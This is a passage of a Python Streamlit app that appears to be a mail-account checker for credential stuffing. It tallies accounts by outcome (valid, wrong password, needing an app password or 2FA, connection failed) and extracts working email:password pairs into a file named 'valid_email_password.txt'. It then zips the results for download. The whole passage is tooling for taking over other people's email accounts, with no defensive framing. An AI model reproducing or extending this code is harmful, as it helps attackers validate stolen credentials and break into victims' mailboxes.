                            log_container.code("\n".join(log_lines), language="text")
                            
                    except Exception as ex:
                        err_msg = f"[EXCEPTION] {str(ex)}"
                        conn_results.append(err_msg)
                        log_lines.append(err_msg)
                        log_container.code("\n".join(log_lines), language="text")
                    
                    if total_accs > 0:
                        progress_bar.progress(min(1.0, checked_count / total_accs))
                    status_text.text(f"Checking... {checked_count}/{total_accs} | Valid: {len(valid_results)} | Wrong: {len(wrong_results)}")
        except Exception as ex:
            st.error(f"Execution thread block error: {ex}")

        progress_bar.empty()
        status_text.success("🎉 Check Complete!")
        
        try:
            stamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            valid_path = os.path.join(CFG["RESULTS_DIR"], f"valid_{stamp}.txt")
            wrong_path = os.path.join(CFG["RESULTS_DIR"], f"wrong_{stamp}.txt")
            need_path = os.path.join(CFG["RESULTS_DIR"], f"need_app_{stamp}.txt")
            failed_path = os.path.join(CFG["RESULTS_DIR"], f"failed_{stamp}.txt")

            with open(valid_path, "w", encoding="utf-8") as f:
                f.write("\n".join(str(item) for item in valid_results) + ("\n" if valid_results else ""))
            with open(wrong_path, "w", encoding="utf-8") as f:
                f.write("\n".join(str(item) for item in wrong_results) + ("\n" if wrong_results else ""))
            with open(need_path, "w", encoding="utf-8") as f:
                f.write("\n".join(str(item) for item in need_app_results) + ("\n" if need_app_results else ""))
            with open(failed_path, "w", encoding="utf-8") as f:
                f.write("\n".join(str(item) for item in conn_results) + ("\n" if conn_results else ""))

            clean_valid_path = "clean_valid_accounts.txt"
            clean_valid_count = 0
            with open(clean_valid_path, "w", encoding="utf-8") as outfile:
                for line in valid_results:
                    try:
                        parts = line.split(":")
                        if len(parts) >= 2:
                            email = parts[0].strip()
                            password_part = parts[1].split("|")[0].strip()
                            outfile.write(f"{email}:{password_part}\n")
                            clean_valid_count += 1
                    except Exception:
                        continue

            zip_name = f"mail_results_{stamp}.zip"
            with zipfile.ZipFile(zip_name, "w", zipfile.ZIP_DEFLATED) as z:
                if os.path.exists(clean_valid_path):
                    z.write(clean_valid_path, arcname="valid_email_password.txt")
                if os.path.exists(wrong_path):
                    z.write(wrong_path, arcname=os.path.basename(wrong_path))
                if os.path.exists(need_path):
                    z.write(need_path, arcname=os.path.basename(need_path))
                if os.path.exists(failed_path):
                    z.write(failed_path, arcname=os.path.basename(failed_path))

            st.markdown("---")
            st.markdown("### 📊 Live Results Summary & ZIP Archive")
            col1, col2, col3, col4 = st.columns(4)
            col1.metric("✅ Clean Valid", clean_valid_count)
            col2.metric("❌ Wrong Password", len(wrong_results))
            col3.metric("🔑 App Password / 2FA", len(need_app_results))
            col4.metric("⚠️ Connection Failed", len(conn_results))
            
            if valid_results:
                st.markdown("#### ✅ Valid Accounts Found:")
                for v in valid_results:
                    st.code(v, language="text")

            with open(zip_name, "rb") as fp:
                zip_bytes = fp.read()

            st.download_button(
                label="📦 Download All Results (.zip Package)",
                data=zip_bytes,
                file_name=zip_name,
                mime="application/zip"
            )
        except Exception as ex:
            st.error(f"Error compiling results export files: {ex}")
